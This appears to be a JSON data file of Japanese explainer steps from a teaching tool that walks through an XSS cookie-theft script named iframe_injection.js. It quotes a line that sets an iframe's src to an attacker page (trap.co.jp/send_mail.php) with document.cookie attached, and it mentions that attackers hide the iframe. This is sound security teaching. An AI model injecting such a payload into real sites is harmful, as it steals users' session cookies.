{
    "index": 2,
    "fileName": "iframe_injection.js",
    "explainers": [
            {
                "questionIndices": [],
                "focusLabels": [],
                "focusComponents": [
                    []
                ],
                "messages": [
                    {
                        "text": "これが攻撃者が脆弱なWebサイトに埋め込もうとしているスクリプトです。",
                        "languages": []
                    }
                ]
            },
            {
                "questionIndices": [],
                "focusLabels": ["iframe.setAttribute(\"src\", \"http://www.trap.co.jp/send_mail.php?cookie=\" + document.cookie);"],
                "focusComponents": [
                    []
                ],
                "messages": [
                    {
                        "text": "以下の部分でユーザのCookieを盗もうとしています。\niframe.setAttribute(\"src\", \"http://www.trap.co.jp/send_mail.php?cookie=\" + document.cookie)",
                        "languages": ["html", "javaScript"]
                    },
                    {
                        "text": "この<iframe>要素によって脆弱なWebサイトに攻撃者の用意したsend_mail.phpというサイトが埋め込まれ、さらにクエリパラメータのcookieの値にユーザのCookieが設定されて送信されます。\nそして攻撃者はsend_mail.php内で受け取ったユーザのCookieの値を自分自身に対してメールで送信することにより、攻撃が完了します。",
                        "languages": ["html"]
                    }
                ]
            },
            {
                "questionIndices": [],
                "focusLabels": ["iframe.width = 320", "iframe.height = 320"],
                "focusComponents": [
                    []
                ],
                "messages": [
                    {
                        "text": "今回は分かりやすさを狙って<iframe>要素にwidth, heightを指定して、実際に画面に表示しようとしていますが本来であれば攻撃者はこの<iframe>要素の表示を隠すことによって攻撃を隠蔽します。",
                        "languages": ["html"]
                    }
                ]
            },
            {
                "questionIndices": [],
                "focusLabels": [
                    "document.body.appendChild(iframe);"
                ],
                "focusComponents": [
                    []
                ],
                "messages": [
                    {
                        "text": "この赤枠で囲まれた部分で脆弱なWebサイトの<body>要素に<iframe>要素を追加しています。",
                        "languages": ["html"]
                    }
                ]
            },
            {
                "questionIndices": [],
                "focusLabels": [],
                "focusComponents": [
                    []
                ],
                "messages": [
                    {
                        "text": "次に攻撃者に対してユーザのCookieをメールで送信するsend_mail.phpを見ていきましょう。",
                        "languages": []
                    }
                ]
            }
        ]
}